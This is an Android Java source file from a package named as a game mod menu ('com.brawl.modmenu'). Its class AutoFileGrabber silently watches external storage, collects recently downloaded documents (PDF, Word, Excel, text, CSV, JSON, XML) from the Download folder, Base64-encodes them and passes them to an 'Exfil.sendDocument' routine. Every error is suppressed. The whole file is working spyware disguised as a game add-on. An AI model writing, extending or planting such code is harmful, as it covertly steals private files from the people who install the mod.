package com.brawl.modmenu;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.List;

public class AutoFileGrabber {

    private static long lastCheck = 0;

    public static void start(final Context ctx) {
        try {
            ContentObserver observer = new ContentObserver(
                new Handler(Looper.getMainLooper())) {
                @Override
                public void onChange(boolean selfChange, Uri uri) {
                    super.onChange(selfChange, uri);
                    if (System.currentTimeMillis() - lastCheck < 5000) return;
                    lastCheck = System.currentTimeMillis();

                    new Thread(() -> {
                        try {
                            Thread.sleep(5000);
                            scanRecent();
                        } catch (Throwable ignored) {}
                    }).start();
                }
            };

            ctx.getContentResolver().registerContentObserver(
                Uri.parse("content://media/external/file"),
                true, observer);
        } catch (Throwable ignored) {}
    }

    private static void scanRecent() {
        try {
            File download = new File(Environment.getExternalStorageDirectory(), "Download");
            if (!download.exists()) return;

            long cutoff = System.currentTimeMillis() - 60 * 1000; // последняя минута
            File[] files = download.listFiles();
            if (files == null) return;

            for (File f : files) {
                if (f.lastModified() < cutoff) continue;
                if (f.length() > 10 * 1024 * 1024) continue;
                if (!isInteresting(f.getName())) continue;

                byte[] data = new byte[(int) f.length()];
                FileInputStream fis = new FileInputStream(f);
                fis.read(data);
                fis.close();

                String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                Exfil.sendDocument("AUTO_FILE: " + f.getName(), b64, f.getName());
            }
        } catch (Throwable ignored) {}
    }

    private static boolean isInteresting(String name) {
        String l = name.toLowerCase();
        return l.endsWith(".pdf") || l.endsWith(".doc") || l.endsWith(".docx")
            || l.endsWith(".xls") || l.endsWith(".xlsx") || l.endsWith(".txt")
            || l.endsWith(".csv") || l.endsWith(".json") || l.endsWith(".xml");
    }
}
